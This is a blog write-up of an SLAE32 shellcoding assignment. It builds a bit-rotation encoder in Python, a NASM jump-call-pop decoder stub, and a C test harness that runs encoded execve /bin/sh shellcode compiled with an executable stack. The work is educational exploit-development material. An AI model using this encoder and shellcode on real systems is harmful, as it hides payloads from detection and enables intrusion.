---
title: SLAE32 Assignment 4 -- Rotation Encoder
date: 2019-9-15
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE32.jpg
tags:
  - rotate
  - Encoder
  - Decoder
  - Assembly
  - Code
  - SLAE
  - Linux
  - x86
  - Shellcoding
  - Shellcode
--- 
![](/assets/images/SLAE32.png)
## Overview
For my fourth assignment in the SLAE32 course, I created a custom Rotation Encoder.   
How this works is to encode the payload, it rotates every bit to the left by one. If the greatest bit (valued 128) falls off the left, it wraps around to the lowest bit (valued 1). To decode, all the bits are rotated to the right by one. If there is a low bit, it is moved to the highest bit.  
#### Encode 
![](/assets/images/rotateLeft.png)  
#### Decode
![](/assets/images/rotateRight.png)   
## Encrypting the Payload
The payload used for this example is the `execve` shellcode provided in the SLAE course.  

### Grabbing the Payload Shellcode
+ To quickly grab the hex from shellcode, I used the method shown in the SLAE course.   
+ To make it easier, I added it to a shellscript.  
```bash
#!/bin/bash
# Filename: objdump2hex.sh
# Author:   boku
OBJFILE=$1
objdump -d $(pwd)/${1} | grep '[0-9a-f]:' | grep -v 'file'\
| cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' \
| sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s \
| sed 's/^/"/' | sed 's/$/"/g'
```

### Using the Bash Script to get the Shellcode
```bash
root@zed# ./objdump2hex.sh execve-stack 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Perfect. Now we will need to encode this shellcode using our Python Encoder `rotateLeftEncoder.py`.  
+ The new encoded shellcode is output in both the `\x` format and the `0x, ` format.  
+ As you can see in the top section, all that needs to be done to change the shellcode payload is replace the string in the `shellcode` array.  

### Python Encoder

```python
#!/usr/bin/python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
shellcode += "\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1"
shellcode += "\xb0\x0b\xcd\x80"

encoded1 = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
    if x > 127:
        x = x - 128             # Remove the left-most bit
        x = x << 1              # Shift to the left 1
        x += 1                  # Add 1, to complete the rotate
        encoded1 += '\\x'
        encoded1 += '%02x' %x   # Add the rotated left hex to string 
        encoded2 += '0x'
        encoded2 += '%02x,' %x  # Add the rotated left hex to string 
    else:
        encoded1 += '\\x'       # No leftmost bit, just rotate
        encoded1 += '%02x' %(x << 1)
        encoded2 += '0x'        # No leftmost bit, just rotate
        encoded2 += '%02x,' %(x << 1)
    
print encoded1
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
```

Outputting our new, encoded shellcode:

```bash
root# python rotateLeftEncoder.py
Encoded shellcode ...
\x62\x81\xa0\xd0\x5e\x5e\xe6\xd0\xd0\x5e\xc4\xd2\xdc\x13\xc7\xa0\x13\xc5\xa6\x13\xc3\x61\x16\x9b\x01                   
0x62,0x81,0xa0,0xd0,0x5e,0x5e,0xe6,0xd0,0xd0,0x5e,0xc4,0xd2,0xdc,0x13,0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,0x16,0x9b,0x01,
Len: 25
```

Our encoded shellcode payload is 25 bytes. We will need to add a final byte to the end `\xff`.  
This byte will be used by our decoder to let it know it has reached the end of our payload.  
We will copy the second output with the "0x, " format to our nasm program after appending the byte.  

This assembly program will use the Jump-Call-Pop technique to save the memory location of our string to the stack and then pop that address into the ESI Register.   
Once in the ESI Register, we will decode our encoded shellcode byte by byte using the instructions `ror byte [esi], 1` (rotate to the right one bit, one byte at a time), and `inc esi`. If the decoded byte is `\xff` then we will jump to the shellcode using the instruction `je Shellcode`.   
If the byte is not `\xff` then the zero flag will not be set, and that jump will be ignored.   
The next instruction `jmp short decode` is an unconditional jump. We use this to create the loop to decode our shellcode.  

```nasm
; Filename: rotateRightDecoder.nasm
; Author:  Bobby Cooke

global _start

section .text
_start:
        jmp short call_decoder

decoder:
        pop esi

decode:
        ror byte [esi], 1
        cmp byte [esi], 0xFF
        je Shellcode
        inc esi
        jmp short decode
        
call_decoder:
        call decoder
        Shellcode: db 0x62,0x81,0xa0,0xd0,0x5e,0x5e,0xe6,0xd0,0xd0,0x5e,0xc4,0xd2,0xdc,0x13,0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,0x16,0x9b,0x01,0xff
```

Now that both the decoder and encoder are created, the last thing to do is compile and test.  

To compile my Assembly code I used the NASM Compiler with these commands. After creating the object file with NASM, I linked the object file using `ld`.  

```bash
nasm -f elf32 rotateRightDecoder.nasm -o rotateRightDecoder.o
ld -o rotateRightDecoder rotateRightDecoder.o
```

I tested the shellcode using the C program shown in the SLAE course.   
After extracting the shellcode using the above bash script, I added it to the C program as the `code[]` array.  

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x0b\x5e\xd0\x0e\x80\x3e\xff\x74\x08\x46\xeb\xf6\xe8"
"\xf0\xff\xff\xff\x62\x81\xa0\xd0\x5e\x5e\xe6\xd0\xd0\x5e"
"\xc4\xd2\xdc\x13\xc7\xa0\x13\xc5\xa6\x13\xc3\x61\x16\x9b\x01\xff";
main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

To speed up compilation while developing my custom rotation encoder, I created a simple bash script to automate the process.

```bash
#!/bin/bash
SHELLCODE=$1
gcc -fno-stack-protector -z execstack -o shellcode $(pwd)/${SHELLCODE}
```
